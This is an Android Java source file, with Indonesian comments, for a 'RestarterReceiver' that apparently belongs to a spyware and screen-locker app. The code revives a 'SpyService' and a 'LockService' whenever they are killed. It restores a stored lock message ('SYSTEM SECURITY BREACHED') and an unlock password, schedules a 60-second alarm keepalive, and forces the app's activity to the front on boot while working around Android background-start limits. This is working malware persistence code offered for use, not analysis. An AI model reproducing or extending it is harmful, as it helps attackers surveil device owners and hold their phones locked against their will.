package com.nullx.pp;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

/**
 * RestarterReceiver: Persistence & Self-Healing Engine.
 * Menghidupkan kembali LockService dan SpyService jika dimatikan paksa.
 * Mendukung Android 14/15 Background Start Restrictions.
 */
public class RestarterReceiver extends BroadcastReceiver {
    
    private static final String TAG = "NXOB_RESTORE";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Restarter Service Triggered: " + (action != null ? action : "Direct Call"));

        // 1. Ambil State Terakhir dari SharedPreferences
        SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        String lastMode = prefs.getString("last_lock_mode", "NORMAL");
        String lastMsg = prefs.getString("last_lock_msg", "SYSTEM SECURITY BREACHED");
        String lastPass = prefs.getString("last_lock_pass", "123");

        // 2. Siapkan Intent Re-aktivasi
        Intent lockIntent = new Intent(context, LockService.class);
        lockIntent.putExtra("mode", lastMode);
        lockIntent.putExtra("message", lastMsg);
        lockIntent.putExtra("password", lastPass);

        Intent spyIntent = new Intent(context, SpyService.class);

        try {
            // FIXED: Menggunakan ContextCompat untuk konsistensi pemanggilan foreground
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(lockIntent);
                context.startForegroundService(spyIntent);
            } else {
                context.startService(lockIntent);
                context.startService(spyIntent);
            }
            Log.d(TAG, "[+] Services resurrected successfully.");
        } catch (Exception e) {
            Log.e(TAG, "[-] Resurrection failed: " + e.getMessage());
        }

        // 3. Schedule AlarmManager keepalive untuk jaga-jaga OS kill lagi
        scheduleAlarmRestart(context);

        // 4. Force Wakeup Logic (Android 10+ Bypass)
        // Hanya trigger wakeup jika memang sedang dalam kondisi lock atau snapshot request
        if (action != null && (action.equals("RestartSpyService") || action.equals(Intent.ACTION_BOOT_COMPLETED))) {
            triggerForceWakeup(context);
        }
    }

    private void triggerForceWakeup(Context context) {
        Intent activityIntent = new Intent(context, MainActivity.class);
        activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK 
                               | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT 
                               | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        
        try {
            context.startActivity(activityIntent);
        } catch (Exception e) {
            // Fallback via PendingIntent jika OS memblokir startDirectActivity
            Log.w(TAG, "[!] Activity start blocked. Executing PendingIntent Fallback.");
            try {
                PendingIntent pendingIntent = PendingIntent.getActivity(
                    context, 0, activityIntent, 
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? 
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT : 0
                );
                pendingIntent.send();
            } catch (PendingIntent.CanceledException ce) {
                Log.e(TAG, "[-] Wakeup fallback failed.");
            }
        }
    }

    private void scheduleAlarmRestart(Context context) {
        try {
            AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent("RestartSpyService");
            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT :
                PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, flags);
            am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 60000, pi);
            Log.d(TAG, "[+] Alarm keepalive scheduled (60s)");
        } catch (Exception e) {
            Log.w(TAG, "[-] Alarm keepalive failed: " + e.getMessage());
        }
    }
}